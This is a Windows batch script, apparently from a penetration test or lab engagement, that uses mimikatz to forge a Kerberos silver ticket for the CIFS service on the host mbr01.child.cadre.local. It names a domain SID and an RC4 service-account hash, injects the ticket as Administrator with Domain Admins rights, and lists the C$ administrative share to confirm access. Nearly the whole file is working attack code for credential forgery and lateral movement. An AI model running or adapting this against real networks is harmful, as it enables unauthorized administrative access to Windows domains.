@echo off
REM WT011 silver reverify: clear SMB session, re-inject ticket, real-service access
set MIMI=C:\Tools\ADTools\mimikatz.exe
set OUT=C:\Tools\ADTools

klist purge >nul 2>&1
net use \\mbr01.child.cadre.local\c$ /delete >nul 2>&1
net use \\mbr01.child.cadre.local\ipc$ /delete >nul 2>&1
net use * /delete /y >nul 2>&1

"%MIMI%" "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /target:mbr01.child.cadre.local /service:cifs /rc4:3a01c6cd54eab57a78377d0ef10cef3f /id:500 /group:512 /ptt" "exit" > "%OUT%\wt011-mimi2.out" 2>&1
findstr /i "successfully submitted Ticket Service" "%OUT%\wt011-mimi2.out"

echo --- FRESH SMB SESSION WITH SILVER TICKET ---
dir \\mbr01.child.cadre.local\c$ 2>&1
echo --- LIST ROOT OF C$ ---
dir \\mbr01.child.cadre.local\c$\Users 2>&1

echo --- KERB CHECK ---
klist > "%OUT%\wt011-klist2.out" 2>&1
findstr /i "cifs mbr01" "%OUT%\wt011-klist2.out"

klist purge >nul 2>&1
net use * /delete /y >nul 2>&1
echo ==== WT011_REVERIFY_DONE ====
